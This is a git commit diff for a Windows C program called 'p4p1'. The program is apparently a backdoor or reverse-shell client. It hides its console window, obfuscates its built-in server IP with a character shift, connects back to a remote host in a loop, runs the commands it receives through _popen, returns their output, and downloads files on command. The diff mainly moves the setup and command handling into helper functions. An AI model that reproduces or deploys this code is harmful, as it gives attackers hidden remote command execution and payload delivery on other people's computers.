de50b7af8461fa4615a4ae88a2ce4b1df4935ef4
Leo Smith <k0oo@icloud.com>
2016-09-03 00:48:19 +0200

    Add files via upload

--- p4p1-h_win.h
+++ p4p1-h_win.h
@@ -20,17 +20,23 @@
 
 typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);
 
+typedef struct {
+
+	int portno;
+	char ip[16];
+
+	struct sockaddr_in client;
+
+} fileWrapper;
+
 char wrecvsid(int sock, int size, int *br);
 char incr(char ch);
 char decr(char ch);
 int iscommand(char buf);
 int download(char * url);
 int sendui(int s, char uin, int * bs);
+int sendprompt(SOCKET s, char uin);
+int setupvar(fileWrapper * file);
+int sendbuf(SOCKET s, char * buf, int size);
+int processdata(SOCKET s, char cmd);
 void stealth();
-
-typedef struct {
-
-	int portno;
-	char ip[16];
-
-} fileWrapper;
--- p4p1-o_win.c
+++ p4p1-o_win.c
@@ -4,64 +4,14 @@ int main(int argc, char * argv[])
 {
 	if(argc == 1)
 		stealth();
+
+
 	fileWrapper file;
 
-    // Create the basic variables so that you can get the port data
-	int portno;     //number of port
-	char ip[16];
-	char ipchar[16];
-	char portchar[6];   //Char retrieved from .cfg file
-	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
-	FILE * fip = fopen("ip.cfg", "r");
-
-	if(fp == NULL){
-		file.portno = 4441;      //If no file set up default port to prevent errors
-	} else {
-		int i = 0;
-		char c;
-		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
-			portchar[i] = c;
-			i++;
-		}
-		portchar[i+1] = '\0';               //Terminate string
-
-		file.portno = atoi(portchar);            //Set up custom port
-		fclose(fp);
-	}
-
-	if(fip == NULL){
-		char ipjib[14] = "97/358/316/213";
-		char corip[15];
-
-		int i;
-
-		for(i = 0; i < strlen(ipjib); i++){
-			char ch;
-			ch = ipjib[i];
-			corip[i] = decr(ch);
-		}
-		corip[14] = '\0';
-
-		strcpy(file.ip, corip);
-
-	} else {
-		int i = 0;
-		char c;
-		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
-			ipchar[i] = c;
-			i++;
-		}
-		ipchar[i] = '\0';
-
-		strcpy(file.ip, ipchar);
-
-		fclose(fip);
-	}
-
-	printf("%s:%d", file.ip, file.portno);
 
 	//Main program
 	while(1){
+		setupvar(&file);
 
 		//startup sa
 		WSADATA wsa;
@@ -76,23 +26,17 @@ int main(int argc, char * argv[])
 		}
 
 		/* setup variables */
-		int cn;							//connect
-		FILE *pPipe;						//command pipe
+		FILE *pPipe;
+		int cn;													//command pipe
 		int bytesSent;                  //number of bytes ent
 		int bytesRecv;              // number of bytes received
 		char sessionID[5] = "";					// Session id given by serv
 		char buf[BUFSIZE] = "";					//buf
-		char prompt[10] = "\n<p4p1 />";
 
 		bytesSent = 0;
 		bytesRecv = SOCKET_ERROR;
 
-		struct sockaddr_in client;				//server to connect information
-		client.sin_family = AF_INET;
-		client.sin_port = htons(file.portno);
-		client.sin_addr.s_addr = inet_addr(file.ip);	//this should not be hard coded.
-
-
+						//server to connect information
 
 		/* create pointers so that the synthacts gets faster*/
 		int * pbs = &bytesSent;
@@ -101,7 +45,7 @@ int main(int argc, char * argv[])
 		/* connect */
 
 		do{
-			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
+			cn = connect(s, (SOCKADDR*) &file.client, sizeof(file.client));
 		} while( cn == SOCKET_ERROR);
 
 		/* receive session ID */
@@ -126,17 +70,9 @@ int main(int argc, char * argv[])
 			/*
 			 *Send Prompt if no session ID
 			 **/
-			if(sessionID[0] == '0'){
-				*pbs = send(s, prompt, sizeof(prompt), 0);
-				if(*pbs == SOCKET_ERROR) { //server disconnected!
-					if(WSAGetLastError() != WSAECONNREFUSED
-					|| WSAGetLastError() == WSAECONNRESET){
-						break;
-					} else {
-						goto close;
-					}
-				}
-			}
+			 if(sendprompt(s, sessionID[0]) < 0){
+				 goto close;
+			 }
 
 			*pbr = SOCKET_ERROR;
 
@@ -150,52 +86,20 @@ int main(int argc, char * argv[])
 					return -1;
 				} else {
 					/*process received data*/
-					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){
+					int q = processdata(s, buf[0]);
+					if(q < 0){
 
-						if(iscommand(buf[0]) == 2){	// exit command
-							memset(buf, 0, BUFSIZE);
-							goto close;
-						} else if (iscommand(buf[0]) == 1) { //file download command
-							memset(buf, 0, BUFSIZE);
-							strcpy(buf, "#!url >");
-
-							*pbs = send(s, buf, BUFSIZE, 0);
-							if(*pbs == SOCKET_ERROR) {
-								if(WSAGetLastError() != WSAECONNREFUSED
-								|| WSAGetLastError() == WSAECONNRESET){
-									break;
-								} else {
-									goto close;
-								}
-							}
-
-							memset(buf, 0, BUFSIZE);
-							*pbr = SOCKET_ERROR;
-							while(*pbr == SOCKET_ERROR){
-								*pbr = recv(s, buf, BUFSIZE, 0);
-								if(*pbr == 0 || *pbr == WSAECONNRESET){
-									break;
-								}
-
-								if(*pbr < 0){
-									goto close;
-								} else {
-									download(buf);
-									memset(buf, 0, BUFSIZE);
-									strcpy(buf, "file downloaded\n");
-								}
-							}
-						} else {
-							memset(buf, 0, BUFSIZE);
-						}
+						goto close;
 
 					} else {
 
 						if( (pPipe = _popen( buf, "r" )) == NULL ){
+
 							memset(buf, 0, BUFSIZE);
 							strcpy(buf, "error in command");
-							printf("error in cmd\n");
+
 						} else {
+
 							memset(buf, 0, BUFSIZE);
 							int i = 0;
 							char ch;
@@ -203,30 +107,150 @@ int main(int argc, char * argv[])
 								buf[i] = ch;
 								i++;
 							}
+
 						}
+
+						/*
+						 * Send back output
+						 **/
+						 if(sendbuf(s, buf, BUFSIZE) > 0){
+							 goto close;
+						 }
 
 					}
 				}
 			}
 
-			/*
-			 * Send back output
-			 **/
+
+
+		}	// end of the while connected loop.
+		close:
+		_pclose(pPipe);
+		WSACleanup();
+	}//end of main while loop.
+	return 0;
+}
+
+int setupvar(fileWrapper * file)
+{
+	int portno;     //number of port
+	char ip[16];
+	char ipchar[16];
+	char portchar[6];   //Char retrieved from .cfg file
+	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
+	FILE * fip = fopen("ip.cfg", "r");
+
+	if(fp == NULL){
+		file->portno = 4441;      //If no file set up default port to prevent errors
+	} else {
+		int i = 0;
+		char c;
+		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
+			portchar[i] = c;
+			i++;
+		}
+		portchar[i+1] = '\0';               //Terminate string
+
+		file->portno = atoi(portchar);            //Set up custom port
+		fclose(fp);
+	}
+
+	if(fip == NULL){
+		char ipjib[14] = "97/358/316/213";
+		char corip[15];
+
+		int i;
+
+		for(i = 0; i < strlen(ipjib); i++){
+			char ch;
+			ch = ipjib[i];
+			corip[i] = decr(ch);
+		}
+		corip[14] = '\0';
+
+		strcpy(file->ip, corip);
+
+	} else {
+		int i = 0;
+		char c;
+		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
+			ipchar[i] = c;
+			i++;
+		}
+		ipchar[i-1] = '\0';
+
+		strcpy(file->ip, ipchar);
+
+		fclose(fip);
+	}
+
+	file->client.sin_family = AF_INET;
+	file->client.sin_port = htons(file->portno);
+	file->client.sin_addr.s_addr = inet_addr(file->ip);	//this should not be hard coded.
+
+}
+
+int processdata(SOCKET s, char cmd)
+{
+	char buf[BUFSIZE] = "";
+	int bytesSent = 0;
+	int bytesRecv = 0;
+
+	int * pbs = &bytesSent;
+	int * pbr = &bytesRecv;
+
+	if(iscommand(cmd) == 1 || iscommand(cmd) == 2){
+
+		if(iscommand(cmd) == 2){	// exit command
+			memset(buf, 0, BUFSIZE);
+			return -1;
+		} else if (iscommand(cmd) == 1) { //file download command
+			memset(buf, 0, BUFSIZE);
+			strcpy(buf, "#!url >");
+
 			*pbs = send(s, buf, BUFSIZE, 0);
 			if(*pbs == SOCKET_ERROR) {
 				if(WSAGetLastError() != WSAECONNREFUSED
 				|| WSAGetLastError() == WSAECONNRESET){
-					break;
+					return -2;
 				} else {
-					goto close;
+					return -1;
 				}
 			}
 
-		}	// end of the while connected loop.
-		close:
-		WSACleanup();
-		_pclose(pPipe);
-	}//end of main while loop.
+			memset(buf, 0, BUFSIZE);
+			*pbr = SOCKET_ERROR;
+			while(*pbr == SOCKET_ERROR){
+				*pbr = recv(s, buf, BUFSIZE, 0);
+				if(*pbr == 0 || *pbr == WSAECONNRESET){
+					return -2;
+				}
+
+				if(*pbr < 0){
+					return -1;
+				} else {
+					download(buf);
+					memset(buf, 0, BUFSIZE);
+					strcpy(buf, "file downloaded\n");
+				}
+			}
+		} else {
+			return -2;
+		}
+
+		/*
+		 * Send back output
+		 **/
+		 if(sendbuf(s, buf, BUFSIZE) > 0){
+			 return -1;
+		 }
+
+	} else {
+
+		return 4;
+
+	}
+
 	return 0;
 }
 
@@ -332,6 +356,50 @@ void stealth()
 	AllocConsole();
 	stealth=FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, 0);
+}
+
+int sendbuf(SOCKET s, char * buf, int size){
+	int bytesSent;
+	int * pbs;
+
+	bytesSent = 0;
+	pbs = &bytesSent;
+
+	*pbs = send(s, buf, size, 0);
+	if(*pbs == SOCKET_ERROR) {
+		if(WSAGetLastError() != WSAECONNREFUSED
+		|| WSAGetLastError() == WSAECONNRESET){
+			return 1;
+		} else {
+			return 2;
+		}
+	}
+
+	return 0;
+}
+
+int sendprompt(SOCKET s, char uin)
+{
+	int bytesSent;
+	int * pbs;
+	char prompt[10] = "\n<p4p1 />";
+
+	bytesSent = 0;
+	pbs = &bytesSent;
+
+	if(uin == '0'){
+		*pbs = send(s, prompt, sizeof(prompt), 0);
+		if(*pbs == SOCKET_ERROR) { //server disconnected!
+			if(WSAGetLastError() != WSAECONNREFUSED
+			|| WSAGetLastError() == WSAECONNRESET){
+				return 2;
+			} else {
+				return 1;
+			}
+		}
+	}
+
+	return 0;
 }
 
 /*
